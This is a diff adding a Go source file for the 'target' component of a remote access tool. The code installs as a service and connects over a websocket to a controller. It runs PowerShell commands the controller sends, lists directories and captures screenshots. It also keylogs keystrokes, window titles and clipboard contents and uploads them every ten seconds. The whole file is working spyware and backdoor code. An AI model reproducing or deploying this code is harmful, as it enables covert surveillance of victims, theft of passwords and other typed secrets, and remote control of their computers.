@@ -1,0 +1,196 @@
+package target
+
+import (
+	"encoding/base64"
+	"encoding/json"
+	"log"
+	"net/url"
+	"os"
+	"os/signal"
+	"strings"
+	"time"
+
+	"github.com/atotto/clipboard"
+	ps "github.com/bhendo/go-powershell"
+	"github.com/bhendo/go-powershell/backend"
+	"github.com/gorilla/websocket"
+	"github.com/kardianos/service"
+
+	"github.com/d0minikt/dragons/lib"
+	"github.com/d0minikt/dragons/target/gather"
+	"github.com/d0minikt/dragons/target/platform"
+)
+
+var (
+	client       = ""
+	keylog       = []string{}
+	applog       = []string{}
+	clipboardlog = []string{}
+)
+
+// Program contains program config
+type Program struct {
+	Address string
+	Socket  *websocket.Conn
+	Shell   ps.Shell
+}
+
+// Start starts the service
+func (p *Program) Start(s service.Service) error {
+	// init websocket
+	interrupt := make(chan os.Signal, 1)
+	signal.Notify(interrupt, os.Interrupt)
+	u := url.URL{Scheme: "ws", Host: p.Address, Path: "/ws"}
+	log.Printf("connecting to %s", u.String())
+	ws, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
+	if err != nil {
+		log.Fatal("dial:", err)
+	}
+	p.Socket = ws
+
+	// powershell
+	backend := &backend.Local{}
+	shell, err := ps.New(backend)
+	if err != nil {
+		panic(err)
+	}
+	p.Shell = shell
+
+	// connect
+	msg := lib.ConnectTargetAction{
+		Type:    "CONNECT_TARGET",
+		Payload: gather.GetTargetDetails(p.Shell, keylog, applog, clipboardlog),
+	}
+	p.Socket.WriteJSON(msg)
+
+	go p.Receiver()
+	go p.Emitter()
+	return nil
+}
+
+// Receiver handles the incomming messages
+func (p *Program) Receiver() {
+	for {
+		_, message, err := p.Socket.ReadMessage()
+		if err != nil {
+			log.Println("read:", err)
+			return
+		}
+		action := lib.Action{}
+		json.Unmarshal(message, &action)
+		switch action.Type {
+		case "DATA":
+			continue
+		case "CONNECT_TO_TARGET":
+			action := lib.StringAction{}
+			json.Unmarshal(message, &action)
+			log.Println(action)
+			client = action.Payload
+		case "INJECT":
+			action := lib.SentFromClientAction{}
+			json.Unmarshal(message, &action)
+			stdout, stderr, err := p.Shell.Execute(action.Payload)
+			var errMessage string
+			if err != nil {
+				stdout = stderr
+				errMessage = "ERROR"
+			}
+			p.Socket.WriteJSON(lib.QueryAction{
+				Type: "STDOUT",
+				Payload: map[string]string{
+					"stdout": strings.TrimSpace(stdout),
+					"error":  errMessage,
+				},
+				To: action.From,
+			})
+		case "GET_DIRECTORY":
+			action := lib.SentFromClientAction{}
+			json.Unmarshal(message, &action)
+
+			dir, _ := lib.GetDirectory(action.Payload)
+			if len(dir.Files) > 0 {
+				p.Socket.WriteJSON(lib.QueryAction{
+					Type:    "GET_DIRECTORY",
+					Payload: dir,
+					To:      action.From,
+				})
+			}
+		case "SCREENSHOT":
+			action := lib.SentFromClientAction{}
+			json.Unmarshal(message, &action)
+
+			bytes := gather.Screenshot("./f.jpg")
+			base64Str := base64.StdEncoding.EncodeToString(bytes)
+			p.Socket.WriteJSON(lib.QueryAction{
+				Type:    "SCREENSHOT",
+				Payload: base64Str,
+				To:      action.From,
+			})
+		default:
+			log.Println(action)
+		}
+	}
+}
+
+// Emitter emits the data
+func (p *Program) Emitter() {
+	// keylogger
+	keypressed := make(chan platform.KeylogFunc)
+	go platform.StartKeylogger(keypressed)
+
+	// how often the data will be sent to server
+	ticker := time.NewTicker(time.Second * 10)
+	defer ticker.Stop()
+
+	// other listeners
+	for {
+		select {
+		// key pressed listener
+		case fx := <-keypressed:
+			key, isSingle := fx()
+			if isSingle {
+				if len(keylog) > 0 {
+					keylog[len(keylog)-1] += key
+				} else {
+					keylog = append(keylog, "")
+				}
+			} else {
+				keylog = append(keylog, "["+key+"]", "")
+			}
+
+			// get window
+			title := platform.GetCurrentWindow()
+			if len(applog) == 0 || title != applog[len(applog)-1] {
+				applog = append(applog, title)
+			}
+			// get clipboard
+			clip, _ := clipboard.ReadAll()
+			if len(clipboardlog) == 0 || clip != clipboardlog[len(clipboardlog)-1] {
+				clipboardlog = append(clipboardlog, clip)
+			}
+		// send data periodically
+		case <-ticker.C:
+			p.Socket.WriteJSON(lib.QueryAction{
+				Type: "LOG",
+				Payload: lib.Log{
+					Keylog:       keylog,
+					Applog:       applog,
+					Clipboardlog: clipboardlog,
+				},
+				To: client,
+			})
+
+			keylog = []string{}
+			applog = []string{}
+			clipboardlog = []string{}
+		}
+	}
+}
+
+// Stop stops the service
+func (p Program) Stop(s service.Service) error {
+	println("close")
+	p.Socket.Close()
+	p.Shell.Exit()
+	return nil
+}
